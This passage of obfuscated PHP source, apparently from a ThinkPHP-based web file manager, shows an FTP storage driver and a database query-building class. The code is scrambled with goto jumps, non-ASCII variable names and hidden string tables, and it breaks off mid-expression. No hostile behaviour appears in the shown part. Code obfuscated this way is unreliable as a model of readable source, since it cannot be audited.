b‹Ä—ÜÂÀ¯: $this->fileList($BË¤²°éˆÍ, $Dä‚©ğªšŠ, $EÑ²´ÖºÊÁ); foreach ($Dä‚©ğªšŠ as $bÑµƒ§‹ÀŞ => $aÈÙÜ¬‰İ) { $Dä‚©ğªšŠ[$bÑµƒ§‹ÀŞ] = $this->folderInfo($aÈÙÜ¬‰İ, $BÃ¹œ¡âÅÈ); } foreach ($EÑ²´ÖºÊÁ as $bÑµƒ§‹ÀŞ => $aÈÙÜ¬‰İ) { $EÑ²´ÖºÊÁ[$bÑµƒ§‹ÀŞ] = $this->fileInfo($aÈÙÜ¬‰İ[$fİ•ÉÑÂß[38]], $BÃ¹œ¡âÅÈ, $aÈÙÜ¬‰İ); } goto F…ãŠ¥åïï; b°Ä‰ÊŞ–ò: $fİ•ÉÑÂß =& $_SERVER[¾÷]; if (!$this->_isconn()) { return !1; } $Dä‚©ğªšŠ = $EÑ²´ÖºÊÁ = array(); goto b‹Ä—ÜÂÀ¯; F…ãŠ¥åïï: return array($fİ•ÉÑÂß[84] => $Dä‚©ğªšŠ, $fİ•ÉÑÂß[83] => $EÑ²´ÖºÊÁ); goto BÄ‘Â­‡‰; BÄ‘Â­‡‰: } public function has($D×²Şé, $F–ø“ÖŒ½ñ = false, $FÉªßãÈùİ = true) { goto A¨¼ç«óŸ‚; BŠ·í¨“: return !1; goto Dï¤ªŸõ¦ó; A¨¼ç«óŸ‚: $DªÚ¯¿öÜ =& $_SERVER[¾÷]; $c‹Û™ğÛŞó = $bİ­ÏÙ«Û = array(); $bÙšó÷õ„É = $F–ø“ÖŒ½ñ ? !0 : !1; goto dàƒ´öõ¯ğ; dàƒ´öõ¯ğ: $this->fileList($D×²Şé, $c‹Û™ğÛŞó, $bİ­ÏÙ«Û, $bÙšó÷õ„É); if ($F–ø“ÖŒ½ñ) { return array($DªÚ¯¿öÜ[211] => count($bİ­ÏÙ«Û), $DªÚ¯¿öÜ[212] => count($c‹Û™ğÛŞó)); } if ($FÉªßãÈùİ) { if (count($bİ­ÏÙ«Û)) { return !0; } } else { if (count($c‹Û™ğÛŞó)) { return !0; } } goto BŠ·í¨“; Dï¤ªŸõ¦ó: } public function listAll($bœªÒ®—ò) { goto bö™¢ÄåÚ; dê¯£Áî§¸: $this->fileList($bœªÒ®—ò, $c¬Ó¯³Âà®, $eœš’ößâ, !0); $eï‹æ»‡œ” = array(); foreach ($eœš’ößâ as $bÅõä †ê±) { $eï‹æ»‡œ”[$bÅõä †ê±[$B‘Äî²Îî¡[38]]] = $bÅõä †ê±[$B‘Äî²Îî¡[87]]; } goto Fî¡˜°œªŠ; bö™¢ÄåÚ: $B‘Äî²Îî¡ =& $_SERVER[¾÷]; if (!$this->_isconn()) { return !1; } $c¬Ó¯³Âà® = $eœš’ößâ = array(); goto dê¯£Áî§¸; Fî¡˜°œªŠ: foreach ($c¬Ó¯³Âà® as $bÅõä †ê±) { if (is_string($bÅõä †ê±)) { $eï‹æ»‡œ”[$bÅõä †ê±] = 0; } } return $this->listAllFiles($bœªÒ®—ò, array_keys($eï‹æ»‡œ”), $eï‹æ»‡œ”); goto D®±ÍİÇéÚ; D®±ÍİÇéÚ: } public function getContent($B©ªÖ‚ßì) { if (!$this->_isconn()) { return !1; } $B©ªÖ‚ßì = $this->iconvSystem($B©ªÖ‚ßì); return $this->fileSubstr($B©ªÖ‚ßì); } public function setContent($BÛ¸ğÜ§Â, $D¸ë×†…¡ = '') { goto Aõ‚Ò‡¯å«; Aõ‚Ò‡¯å«: if (!$this->_isconn()) { return !1; } $a¦¼³ƒÚ¨ = $this->pathThis($this->iconvSystem($BÛ¸ğÜ§Â)); $CõÆ£¸º = $this->tempFile($a¦¼³ƒÚ¨); goto F”‹ È™¶; aÕßÊÇîÎ»: return $Aˆ†ªŠÎÅİ; goto e¸£»ßïÔ´; F”‹ È™¶: file_put_contents($CõÆ£¸º, $D¸ë×†…¡); $Aˆ†ªŠÎÅİ = $this->upload($BÛ¸ğÜ§Â, $this->iconvApp($CõÆ£¸º)); $this->tempFileRemve($CõÆ£¸º); goto aÕßÊÇîÎ»; e¸£»ßïÔ´: } public function fileSubstr($aƒĞ¡…ˆ¬, $BË­Í´˜Â = 0, $aáà²Á‚âË = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($aƒĞ¡…ˆ¬, $BË­Í´˜Â, $aáà²Á‚âË); } private function ftpRequest($E›¾«ê÷ª, $AÆ‘ÀÈĞÖÆ = 0, $B´ÂÀ†Õè× = false) { goto CŠß¸ä¹ó¡; EŒÌõË¥¨©: curl_setopt($F—Œä…İ½Ï, CURLOPT_URL, $c–Äğæá½– . $this->pathEncode($E›¾«ê÷ª)); curl_setopt($F—Œä…İ½Ï, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($B´ÂÀ†Õè×) { $FÈÍˆŞÎÖ› = $AÆ‘ÀÈĞÖÆ + $B´ÂÀ†Õè× - 1; curl_setopt($F—Œä…İ½Ï, CURLOPT_RANGE, "{$AÆ‘ÀÈĞÖÆ}\x2d{$FÈÍˆŞÎÖ›}"); } goto f°­éØ¨¢; f°­éØ¨¢: curl_setopt($F—Œä…İ½Ï, CURLOPT_RETURNTRANSFER, 1); $açº‚†‚â = curl_exec($F—Œä…İ½Ï); curl_close($F—Œä…İ½Ï); goto FÄ–Áæ¹¨Ğ; FÄ–Áæ¹¨Ğ: return $açº‚†‚â; goto B„¸´¢‘é; CŠß¸ä¹ó¡: $E›¾«ê÷ª = $this->iconvSystem($E›¾«ê÷ª); $c–Äğæá½– = $this->scheme . $this->host . $_SERVER[¾÷][14] . $this->port; $F—Œä…İ½Ï = curl_init(); goto EŒÌõË¥¨©; B„¸´¢‘é: } public function upload($A¶Ïˆ™Âö, $A…ÍĞë‡ , $e‘—§£¯äƒ = false, $d´‡†ô‘ò = REPEAT_REPLACE) { goto dÕî†«¿Ú‹; dÕî†«¿Ú‹: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($A¶Ïˆ™Âö))) { return !1; } $A¶Ïˆ™Âö = $this->iconvSystem($A¶Ïˆ™Âö); goto D´†…õ ; D´†…õ : $A…ÍĞë‡  = $this->iconvSystem($A…ÍĞë‡ ); $B‰  Â¨ğÚ = ftp_nb_put($this->connect, $A¶Ïˆ™Âö, $A…ÍĞë‡ , FTP_BINARY); while ($B‰  Â¨ğÚ == FTP_MOREDATA) { $B‰  Â¨ğÚ = ftp_nb_continue($this->connect); } goto e†Œ¶ƒÒè¹; e†Œ¶ƒÒè¹: if ($B‰  Â¨ğÚ != FTP_FINISHED) { return !1; } return $this->getPathOuter($A¶Ïˆ™Âö); goto eÍ°•á”ÀÚ; eÍ°•á”ÀÚ: } public function download($DÆê¹Ê‡¸, $e‰›©Î“‚ = '') { goto f•÷¹ï­­„; f»Ğ¯ìäØ: while ($aÎë¥‹î˜à == FTP_MOREDATA) { $aÎë¥‹î˜à = ftp_nb_continue($this->connect); } if ($aÎë¥‹î˜à != FTP_FINISHED) { return !1; } return $this->iconvApp($e‰›©Î“‚); goto DÄù—óò¥›; f•÷¹ï­­„: if (!$this->_isconn()) { return !1; } $A‘çÅ‡·ÑÀ = $this->pathFather($e‰›©Î“‚); if (!IO::mkdir($A‘çÅ‡·ÑÀ)) { return !1; } goto AÄ½‘¦Ü—»; AÄ½‘¦Ü—»: $DÆê¹Ê‡¸ = $this->iconvSystem($DÆê¹Ê‡¸); $e‰›©Î“‚ = $this->iconvSystem($e‰›©Î“‚); $aÎë¥‹î˜à = ftp_nb_get($this->connect, $e‰›©Î“‚, $DÆê¹Ê‡¸, FTP_BINARY); goto f»Ğ¯ìäØ; DÄù—óò¥›: } public function exist($cŞéÅò‹¯¥) { return $this->isFile($cŞéÅò‹¯¥) || $this->isFolder($cŞéÅò‹¯¥); } public function isFile($f÷†°ÙŒ¨â) { return !$this->isFolder($f÷†°ÙŒ¨â) && $this->objectMeta($f÷†°ÙŒ¨â); } public function isFolder($AÉ·Òóä) { return $this->cacheMethod($_SERVER[¾÷][207], $AÉ·Òóä); } protected function objectMeta($Dá†¥ª‰è±) { return $this->cacheMethod($_SERVER[¾÷][208], $Dá†¥ª‰è±); } protected function _objectMeta($a†ï±ï†ãˆ) { goto dé™îÛİˆ‡; B††Äæªº£: $a†ï±ï†ãˆ = $this->iconvSystem($a†ï±ï†ãˆ); $EÑõ‚Û’øö = array($Få“¹›‹á[38] => $this->iconvApp($a†ï±ï†ãˆ), $Få“¹›‹á[39] => $Få“¹›‹á[201], $Få“¹›‹á[87] => 0); @ftp_chdir($this->connect, $Få“¹›‹á[18]); goto C³¹í‹±·Ê; dé™îÛİˆ‡: $Få“¹›‹á =& $_SERVER[¾÷]; if ($a†ï±ï†ãˆ == $Få“¹›‹á[43] || $a†ï±ï†ãˆ == $Få“¹›‹á[18]) { return array(); } if (!$this->_isconn()) { return !1; } goto B††Äæªº£; C³¹í‹±·Ê: $aÏˆ‹¾Û¿‹ = @ftp_size($this->connect, $a†ï±ï†ãˆ); if ($aÏˆ‹¾Û¿‹ != -1) { $EÑõ‚Û’øö[$Få“¹›‹á[87]] = $aÏˆ‹¾Û¿‹; } else { $f©Ñªˆ½ã‚ = @ftp_chdir($this->connect, $a†ï±ï†ãˆ); if (!$f©Ñªˆ½ã‚) { return !1; } $EÑõ‚Û’øö[$Få“¹›‹á[39]] = $Få“¹›‹á[86]; } return $EÑõ‚Û’øö; goto Fğ÷’¦’…‡; Fğ÷’¦’…‡: } protected function _isFolder($A¬©–¿‡¦•) { $DìóÅÔª»‹ =& $_SERVER[¾÷]; if ($A¬©–¿‡¦• == $DìóÅÔª»‹[43] || $A¬©–¿‡¦• == $DìóÅÔª»‹[18]) { return !0; } $c‹˜·æË„ = $this->_objectMeta($A¬©–¿‡¦•); return isset($c‹˜·æË„[$DìóÅÔª»‹[39]]) && $c‹˜·æË„[$DìóÅÔª»‹[39]] == $DìóÅÔª»‹[86] ? !0 : !1; } } goto E—©´¹áÆĞ; e•Ê½Şİç: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\x6e\x65\x71" => "\74\76", "\x67\164" => "\x3e", "\x65\x67\164" => "\76\x3d", "\154\164" => "\x3c", "\x65\x6c\164" => "\x3c\x3d", "\x6e\157\164\154\x69\153\145" => "\116\117\x54\40\114\111\x4b\105", "\154\151\x6b\x65" => "\114\x49\113\105", "\151\x6e" => "\111\x4e", "\156\x6f\164\x69\x6e" => "\116\117\x54\40\111\x4e", "\x6e\x6f\x74\x20\151\x6e" => "\x4e\x4f\x54\x20\111\x4e", "\142\145\x74\x77\x65\145\x6e" => "\102\105\124\127\105\x45\x4e", "\x6e\x6f\x74\142\145\164\x77\x65\x65\x6e" => "\116\117\x54\x20\102\105\124\127\105\105\x4e", "\x6e\x6f\x74\40\x62\145\164\x77\145\145\156" => "\x4e\x4f\124\x20\x42\x45\124\127\105\105\116"); protected $selectSql = "\123\x45\x4c\105\103\x54\45\x44\x49\123\124\x49\x4e\103\x54\45\40\x25\x46\111\105\x4c\x44\45\x20\x46\x52\x4f\x4d\40\x25\x54\x41\102\x4c\x45\45\x25\x4a\117\x49\116\45\x25\x57\110\105\122\x45\x25\45\x47\x52\117\x55\x50\45\x25\x48\x41\126\111\x4e\x47\45\x25\117\122\x44\105\122\x25\45\114\x49\115\111\x54\45\x20\45\x55\116\x49\x4f\x4e\x25\x25\103\117\x4d\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $fï©‘òºì¤ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¾÷][896], $fï©‘òºì¤); } public function factory($bµè²ƒ¸Õ = '') { goto FöÂîÂ·‘; cÂç™ÆœÓ™: return $fªÇšÆ¨àí; goto A¯İ‰‚æ•æ; b•‡…·¡„: $this->dbType = ucwords(strtolower($bµè²ƒ¸Õ[$cÇÈ¢–Ç¯[897]])); $FÈ‚ëß˜Ï“ = $cÇÈ¢–Ç¯[899] . $this->dbType; if (class_exists($FÈ‚ëß˜Ï“)) { $fªÇšÆ¨àí = new $FÈ‚ëß˜Ï“($bµè²ƒ¸Õ); if ($cÇÈ¢–Ç¯[747] != strtolower($bµè²ƒ¸Õ[$cÇÈ¢–Ç¯[897]])) { $fªÇšÆ¨àí->dbType = strtoupper($this->dbType); } else { $fªÇšÆ¨àí->dbType = $this->_getDsnType($bµè²ƒ¸Õ[$cÇÈ¢–Ç¯[852]]); } } else { think_exception(think_lang($cÇÈ¢–Ç¯[900]) . $cÇÈ¢–Ç¯[901] . $FÈ‚ëß˜Ï“); } goto cÂç™ÆœÓ™; FöÂîÂ·‘: $cÇÈ¢–Ç¯ =& $_SERVER[¾÷]; $bµè²ƒ¸Õ = $this->parseConfig($bµè²ƒ¸Õ); if (empty($bµè²ƒ¸Õ[$cÇÈ¢–Ç¯[897]])) { think_exception(think_lang($cÇÈ¢–Ç¯[898])); } goto b•‡…·¡„; A¯İ‰‚æ•æ: } public function __call($CŸùóùîÃ, $C˜„Ù½’÷à) { if (method_exists($this, $CŸùóùîÃ)) { return call_user_func_array(array($this, $CŸùóùîÃ), $C˜„Ù½’÷à); } } protected function _getDsnType($EªÔŞÃâ…ï) { $DÃÄ²‡ìî˜ = explode($_SERVER[¾÷][14], $EªÔŞÃâ…ï); $A‡Ù—Ï¾Ú = strtoupper(trim($DÃÄ²‡ìî˜[0])); return $A‡Ù—Ï¾Ú; } private function parseConfig($Fôó’¶Æù³ = '') { $a£Ò¶ä…×© =& $_SERVER[¾÷]; if (!empty($Fôó’¶Æù³) && is_string($Fôó’¶Æù³)) { $Fôó’¶Æù³ = $this->parseDSN($Fôó’¶Æù³); } elseif (is_array($Fôó’¶Æù³)) { $Fôó’¶Æù³ = array_change_key_case($Fôó’¶Æù³); $Fôó’¶Æù³ = array($a£Ò¶ä…×©[897] => $Fôó’¶Æù³[$a£Ò¶ä…×©[746]], $a£Ò¶ä…×©[825] => $Fôó’¶Æù³[$a£Ò¶ä…×©[902]], $a£Ò¶ä…×©[826] => $Fôó’¶Æù³[$a£Ò¶ä…×©[903]], $a£Ò¶ä…×©[823] => $Fôó’¶Æù³[$a£Ò¶ä…×©[904]], $a£Ò¶ä…×©[824] => $Fôó’¶Æù³[$a£Ò¶ä…×©[905]], $a£Ò¶ä…×©[27] => $Fôó’¶Æù³[$a£Ò¶ä…×©[906]], $a£Ò¶ä…×©[852] => $Fôó’¶Æù³[$a£Ò¶ä…×©[748]], $a£Ò¶ä…×©[23] => isset($Fôó’¶Æù³[$a£Ò¶ä…×©[907]]) ? $Fôó’¶Æù³[$a£Ò¶ä…×©[907]] : array()); } elseif (empty($Fôó’¶Æù³)) { if (think_config($a£Ò¶ä…×©[908]) && $a£Ò¶ä…×©[747] != strtolower(think_config($a£Ò¶ä…×©[909]))) { $Fôó’¶Æù³ = $this->parseDSN(think_config($a£Ò¶ä…×©[908])); } else { $Fôó’¶Æù³ = array($a£Ò¶ä…×©[897] => think_config($a£Ò¶ä…×©[909]), $a£Ò¶ä…×©[825] => think_config($a£Ò¶ä…×©[910]), $a£Ò¶ä…×©[826] => think_config($a£Ò¶ä…×©[911]), $a£Ò¶ä…×©[823] => think_config($a£Ò¶ä…×©[912]), $a£Ò¶ä…×©[824] => think_config($a£Ò¶ä…×©[913]), $a£Ò¶ä…×©[27] => think_config($a£Ò¶ä…×©[251]), $a£Ò¶ä…×©[852] => think_config($a£Ò¶ä…×©[908]), $a£Ò¶ä…×©[23] => think_config($a£Ò¶ä…×©[914])); } } return $Fôó’¶Æù³; } protected function initConnect($eò½õ±Ø¢» = true) { if (1 == think_config($_SERVER[¾÷][28])) { $this->_linkID = $this->multiConnect($eò½õ±Ø¢»); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $cÏ§šÖº’Ú => $a‚‚öô·±œ) { $this->_linkID = $a‚‚öô·±œ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($cŞòïİÅ¾¡ = false) { $F™ØŠœõÅ¬ =& $_SERVER[¾÷]; static $fÑÚÏô•è· = array(); if (empty($fÑÚÏô•è·)) { foreach ($this->config as $eÜ‡Ííê Î => $Fõ¡æÚÊ©Ú) { $fÑÚÏô•è·[$eÜ‡Ííê Î] = explode($F™ØŠœõÅ¬[57], $Fõ¡æÚÊ©Ú); } } if (think_config($F™ØŠœõÅ¬[915])) { if ($cŞòïİÅ¾¡) { $a±‰¡ƒÚº = floor(mt_rand(0, think_config($F™ØŠœõÅ¬[916]) - 1)); } else { if (is_numeric(think_config($F™ØŠœõÅ¬[917]))) { $a±‰¡ƒÚº = think_config($F™ØŠœõÅ¬[917]); } else { $a±‰¡ƒÚº = floor(mt_rand(think_config($F™ØŠœõÅ¬[916]), count($fÑÚÏô•è·[$F™ØŠœõÅ¬[823]]) - 1)); } } } else { $a±‰¡ƒÚº = floor(mt_rand(0, count($fÑÚÏô•è·[$F™ØŠœõÅ¬[823]]) - 1)); } $bßÁˆ—‚İ— = array($F™ØŠœõÅ¬[825] => isset($fÑÚÏô•è·[$F™ØŠœõÅ¬[825]][$a±‰¡ƒÚº]) ? $fÑÚÏô•è·[$F™ØŠœõÅ¬[825]][$a±‰¡ƒÚº] : $fÑÚÏô•è·[$F™ØŠœõÅ¬[825]][0], $F™ØŠœõÅ¬[826] => isset($fÑÚÏô•è·[$F™ØŠœõÅ¬[826]][$a±‰¡ƒÚº]) ? $fÑÚÏô•è·[$F™ØŠœõÅ¬[826]][$a±‰¡ƒÚº] : $fÑÚÏô•è·[$F™ØŠœõÅ¬[826]][0], $F™ØŠœõÅ¬[823] => isset($fÑÚÏô•è·[$F™ØŠœõÅ¬[823]][$a±‰¡ƒÚº]) ? $fÑÚÏô•è·[$F™ØŠœõÅ¬[823]][$a±‰¡ƒÚº] : $fÑÚÏô•è·[$F™ØŠœõÅ¬[823]][0], $F™ØŠœõÅ¬[824] => isset($fÑÚÏô•è·[$F™ØŠœõÅ¬[824]][$a±‰¡ƒÚº]) ? $fÑÚÏô•è·[$F™ØŠœõÅ¬[824]][$a±‰¡ƒÚº] : $fÑÚÏô•è·[$F™ØŠœõÅ¬[824]][0], $F™ØŠœõÅ¬[27] => isset($fÑÚÏô•è·[$F™ØŠœõÅ¬[27]][$a±‰¡ƒÚº]) ? $fÑÚÏô•è·[$F™ØŠœõÅ¬[27]][$a±‰¡ƒÚº] : $fÑÚÏô•è·[$F™ØŠœõÅ¬[27]][0], $F™ØŠœõÅ¬[852] => isset($fÑÚÏô•è·[$F™ØŠœõÅ¬[852]][$a±‰¡ƒÚº]) ? $fÑÚÏô•è·[$F™ØŠœõÅ¬[852]][$a±‰¡ƒÚº] : $fÑÚÏô•è·[$F™ØŠœõÅ¬[852]][0], $F™ØŠœõÅ¬[23] => isset($fÑÚÏô•è·[$F™ØŠœõÅ¬[23]][$a±‰¡ƒÚº]) ? $fÑÚÏô•è·[$F™ØŠœõÅ¬[23]][$a±‰¡ƒÚº] : $fÑÚÏô•è·[$F™ØŠœõÅ¬[23]][0]); return $this->connect($bßÁˆ—‚İ—, $a±‰¡ƒÚº); } public function parseDSN($F¸¿•¶Ë) { $C­¬Öèğö =& $_SERVER[¾÷]; if (empty($F¸¿•¶Ë)) { return !1; } $cŞ“Æ™ŞÃ† = parse_url($F¸¿•¶Ë); if ($cŞ“Æ™ŞÃ†[$C­¬Öèğö[183]]) { $E¾§Š–Ö”˜ = array($C­¬Öèğö[897] => $cŞ“Æ™ŞÃ†[$C­¬Öèğö[183]], $C­¬Öèğö[825] => isset($cŞ“Æ™ŞÃ†[$C­¬Öèğö[566]]) ? $cŞ“Æ™ŞÃ†[$C­¬Öèğö[566]] : $C­¬Öèğö[43], $C­¬Öèğö[826] => isset($cŞ“Æ™ŞÃ†[$C­¬Öèğö[918]]) ? $cŞ“Æ™ŞÃ†[$C­¬Öèğö[918]] : $C­¬Öèğö[43], $C­¬Öèğö[823] => isset($cŞ“Æ™ŞÃ†[$C­¬Öèğö[184]]) ? $cŞ“Æ™ŞÃ†[$C­¬Öèğö[184]] : $C­¬Öèğö[43], $C­¬Öèğö[824] => isset($cŞ“Æ™ŞÃ†[$C­¬Öèğö[185]]) ? $cŞ“Æ™ŞÃ†[$C­¬Öèğö[185]] : $C­¬Öèğö[43], $C­¬Öèğö[27] => isset($cŞ“Æ™ŞÃ†[$C­¬Öèğö[85]]) ? substr($cŞ“Æ™ŞÃ†[$C­¬Öèğö[85]], 1) : $C­¬Öèğö[43]); } else { preg_match($C­¬Öèğö[919], trim($F¸¿•¶Ë), $B¾î¾Ú•Ÿº); $E¾§Š–Ö”˜ = array($C­¬Öèğö[897] => $B¾î¾Ú•Ÿº[1], $C­¬Öèğö[825] => $B¾î¾Ú•Ÿº[2], $C­¬Öèğö[826] => $B¾î¾Ú•Ÿº[3], $C­¬Öèğö[823] => $B¾î¾Ú•Ÿº[4], $C­¬Öèğö[824] => $B¾î¾Ú•Ÿº[5], $C­¬Öèğö[27] => $B¾î¾Ú•Ÿº[6]); } $E¾§Š–Ö”˜[$C­¬Öèğö[852]] = $C­¬Öèğö[43]; return $E¾§Š–Ö”˜; } protected function debug() { $C´¶ïºœÚ =& $_SERVER[¾÷]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $C´¶ïºœÚ[920]; if (think_config($C´¶ïºœÚ[921])) { think_status($C´¶ïºœÚ[922]); think_trace($this->queryStr . $C´¶ïºœÚ[923] . think_status($C´¶ïºœÚ[30], $C´¶ïºœÚ[922], 6) . $C´¶ïºœÚ[924], $C´¶ïºœÚ[43], $C´¶ïºœÚ[925]); } } protected function parseLock($A›ßÑ¬¡ë– = false) { $e³¾œó¦”« =& $_SERVER[¾÷]; if (!$A›ßÑ¬¡ë–) { return $e³¾œó¦”«[43]; } if ($e³¾œó¦”«[854] == $this->dbType) { return $e³¾œó¦”«[926]; } return $e³¾œó¦”«[927]; } protected function parseSet($b­¯İ½µÒ») { $F–÷°æŠ‡ˆ =& $_SERVER[¾÷]; foreach ($b­¯İ½µÒ» as $bÔ‹ÛÅ´ => $CĞêœº¯»ç) { if (is_array($CĞêœº¯»ç) && $F–÷°æŠ‡ˆ[302] == $CĞêœº¯»ç[0]) { $fÕ¯âÔÖ¡°[] = $this->parseKey($bÔ‹ÛÅ´) . $F–÷°æŠ‡ˆ[928] . $CĞêœº¯»ç[1]; } elseif (is_scalar($CĞêœº¯»ç) || is_null($CĞêœº¯»ç)) { $fÕ¯âÔÖ¡°[] = $this->parseKey($bÔ‹ÛÅ´) . $F–÷°æŠ‡ˆ[928] . $this->parseValue($CĞêœº¯»ç); } } return $F–÷°æŠ‡ˆ[929] . implode($F–÷°æŠ‡ˆ[57], $fÕ¯âÔÖ¡°); } protected function bindParam($b’²¬‡ù—Õ, $EÅéÇ¤¹ê) { $this->bind[$_SERVER[¾÷][14] . $b’²¬‡ù—Õ] = $EÅéÇ¤¹ê; } protected function parseBind($B½Ÿ‰Ò¿) { $B½Ÿ‰Ò¿ = array_merge($this->bind, $B½Ÿ‰Ò¿); $this->bind = array(); return $B½Ÿ‰Ò¿; } function parseKey(&$eçÏƒ˜¾™ì, $Dİ¯—éŒÉ = true) { if ($Dİ¯—éŒÉ) { $eçÏƒ˜¾™ì = $this->parseKeyCheck($eçÏƒ˜¾™ì); } return $eçÏƒ˜¾™ì; } function parseKeyCheck($E§ƒÒà—ãø) { $D„­Ş‰É®Ù =& $_SERVER[¾÷]; $E§ƒÒà—ãø = trim($E§ƒÒà—ãø); if (!preg_match($D„­Ş‰É®Ù[930], $E§ƒÒà—ãø)) { think_exception($D„­Ş‰É®Ù[931] . $E§ƒÒà—ãø); } return $E§ƒÒà—ãø; } protected function parseValue($EƒºªáŸ‚ä) { $e‡ôîæ¢¿Î =& $_SERVER[¾÷]; if (is_string($EƒºªáŸ‚ä)) { $EƒºªáŸ‚ä = $e‡ôîæ¢¿Î[893] . $this->escapeString($EƒºªáŸ‚ä) . $e‡ôîæ¢¿Î[893]; } elseif (isset($EƒºªáŸ‚ä[0]) && is_string($EƒºªáŸ‚ä[0]) && strtolower($EƒºªáŸ‚ä[0]) == $e‡ôîæ¢¿Î[302]) { $EƒºªáŸ‚ä = $this->escapeString($EƒºªáŸ‚ä[1]); } elseif (is_array($EƒºªáŸ‚ä)) { $EƒºªáŸ‚ä = array_map(array($this, $e‡ôîæ¢¿Î[894]), $EƒºªáŸ‚ä); } elseif (is_bool($EƒºªáŸ‚ä)) { $EƒºªáŸ‚ä = $EƒºªáŸ‚ä ? $e‡ôîæ¢¿Î[96] : $e‡ôîæ¢¿Î[500]; } elseif (is_null($EƒºªáŸ‚ä)) { $EƒºªáŸ‚ä = $e‡ôîæ¢¿Î[112]; } return $EƒºªáŸ‚ä; } protected function parseField($Bã„¡’ƒÍ²) { $bÎ¦»¼Ãó¼ =& $_SERVER[¾÷]; if (is_string($Bã„¡’ƒÍ²) && strpos($Bã„¡’ƒÍ², $bÎ¦»¼Ãó¼[57])) { $Bã„¡’ƒÍ² = explode($bÎ¦»¼Ãó¼[57], $Bã„¡’ƒÍ²); } if (is_array($Bã„¡’ƒÍ²)) { $C¶÷´”ÊÓ = array(); foreach ($Bã„¡’ƒÍ² as $Cğ‚§›‰ğ† => $aÔ‡‹‘õÁ‹) { if (!is_numeric($Cğ‚§›‰ğ†)) { $C¶÷´”ÊÓ[] = $this->parseKey($Cğ‚§›‰ğ†, !1) . $bÎ¦»¼Ãó¼[932] . $this->parseKey($aÔ‡‹‘õÁ‹); } else { $C¶÷´”ÊÓ[] = $this->parseKey($aÔ‡‹‘õÁ‹); } } $dİ¦·„˜¯ = implode($bÎ¦»¼Ãó¼[57], $C¶÷´”ÊÓ); } elseif (is_string($Bã„¡’ƒÍ²) && !empty($Bã„¡’ƒÍ²)) { $dİ¦·„˜¯ = $Bã„¡’ƒÍ²; } else { $dİ¦·„˜¯ = $bÎ¦»¼Ãó¼[191]; } return $dİ¦·„˜¯; } protected function parseTable($dÄØ´·£„˜) { $c«šƒ÷°­¢ =& $_SERVER[¾÷]; if (is_array($dÄØ´·£„˜)) { $A“ŠÁÇ¼¢· = array(); foreach ($dÄØ´·£„˜ as $D¹¿Éºñ => $f¤ãõ›¼óÄ) { if (!is_numeric($D¹¿Éºñ)) { $A“ŠÁÇ¼¢·[] = $this->parseKey($D¹¿Éºñ) . $c«šƒ÷°­¢[60] . $this->parseKey($f¤ãõ›¼óÄ); } else { $A“ŠÁÇ¼¢·[] = $this->parseKey($D¹¿Éºñ); } } $dÄØ´·£„˜ = $A“ŠÁÇ¼¢·; } elseif (is_string($dÄØ´·£„˜)) { if (strstr($dÄØ´·£„˜, $c«šƒ÷°­¢[60])) { return $dÄØ´·£„˜; } $dÄØ´·£„˜ = explode($c«šƒ÷°­¢[57], $dÄØ´·£„˜); array_walk($dÄØ´·£„˜, array($this, $c«šƒ÷°­¢[843])); } return $c«šƒ÷°­¢[837] . trim(implode($c«šƒ÷°­¢[933], $dÄØ´·£„˜), $c«šƒ÷°­¢[389]) . $c«šƒ÷°­¢[837]; } protected function parseWhere($B×«Ê‰œĞ) { $B¿Şùã÷ =& $_SERVER[¾÷]; $a‚–ÉÄ×Á = $B¿Şùã÷[43]; if (is_string($B×«Ê‰œĞ)) { $a‚–ÉÄ×Á = $B×«Ê‰œĞ; } else { $e‡³Ê‰Œêñ = isset($B×«Ê‰œĞ[$B¿Şùã÷[934]]) ? strtoupper($B×«Ê‰œĞ[$B¿Şùã÷[934]]) : $B¿Şùã÷[43]; if (in_array($e‡³Ê‰Œêñ, array($B¿Şùã÷[935], $B¿Şùã÷[936], $B¿Şùã÷[937]))) { $e‡³Ê‰Œêñ = $B¿Şùã÷[60] . $e‡³Ê‰Œêñ . $B¿Şùã÷[60]; unset($B×«Ê‰œĞ[$B¿Şùã÷[934]]); } else { $e‡³Ê‰Œêñ = $B¿Şùã÷[938]; } foreach ($B×«Ê‰œĞ as $BÆÀÇ„è—‡ => $CÎ„°¢âæŠ) { $a‚–ÉÄ×Á .= $B¿Şùã÷[282]; if (is_numeric($BÆÀÇ„è—‡)) { $BÆÀÇ„è—‡ = $B¿Şùã÷[939]; } if (0 === strpos($BÆÀÇ„è—‡, $B¿Şùã÷[80])) { $a‚–ÉÄ×Á .= $this->parseThinkWhere($BÆÀÇ„è—‡, $CÎ„°¢âæŠ); } else { if (!preg_match($B¿Şùã÷[940], trim($BÆÀÇ„è—‡))) { think_exception(think_lang($B¿Şùã÷[941]) . $B¿Şùã÷[14] . $BÆÀÇ„è—‡); } $BÜªêœè‹Ò = is_array($CÎ„°¢âæŠ) && isset($CÎ„°¢âæŠ[$B¿Şùã÷[942]]); $BÆÀÇ„è—‡ = trim($BÆÀÇ„è—‡); if (strpos($BÆÀÇ„è—‡, $B¿Şùã÷[288])) { $EèïÌ«óóé = explode($B¿Şùã÷[288], $BÆÀÇ„è—‡); $dšÕë¹èï = array(); foreach ($EèïÌ«óóé as $FÈ­¢¨ŒñŠ => $Eîèƒâç¼ô) { $eê—ï½óÜ­ = $BÜªêœè‹Ò ? $CÎ„°¢âæŠ[$FÈ­¢¨ŒñŠ] : $CÎ„°¢âæŠ; $dšÕë¹èï[] = $B¿Şùã÷[265] . 